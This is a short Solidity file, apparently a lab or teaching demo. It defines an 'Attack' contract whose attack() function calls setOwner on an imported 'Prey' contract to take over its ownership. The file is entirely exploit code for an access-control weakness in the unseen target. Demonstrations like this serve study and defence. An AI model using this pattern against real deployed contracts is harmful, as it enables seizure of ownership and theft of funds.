// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./Prey.sol";

contract Attack {

    Prey public prey;

    constructor(address _prey) {
        prey = Prey(_prey);
    }

    function attack() public {
        prey.setOwner(address(this));
    }
}